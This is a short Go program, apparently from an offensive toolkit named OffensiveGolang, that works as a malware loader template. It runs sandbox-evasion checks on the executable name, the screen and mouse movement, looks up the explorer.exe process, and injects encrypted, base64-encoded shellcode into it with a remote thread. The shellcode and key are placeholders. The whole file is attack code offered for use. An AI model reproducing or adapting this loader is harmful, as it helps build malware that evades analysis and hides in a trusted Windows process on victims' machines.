package main

import (
	"OffensiveGolang/pkg/evasion"
	shellcode "OffensiveGolang/pkg/payloads/injections/remoteThread"
	"fmt"
)

func main() {

	evasion.CheckNameEXE("main.exe")
	evasion.CheckScreen()
	evasion.CheckMouse(5)

	var pid int = evasion.GetPID("explorer.exe")
	if pid != 0 {
		enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
		key := "<KEY BASE64-ENCODED>"

		errorRemoteThread := shellcode.ShellCodeCreateRemoteThread(pid, enc_string, key)
		if errorRemoteThread != nil {
			fmt.Printf("[!] Error: %s\n", errorRemoteThread)
		}
	}
}
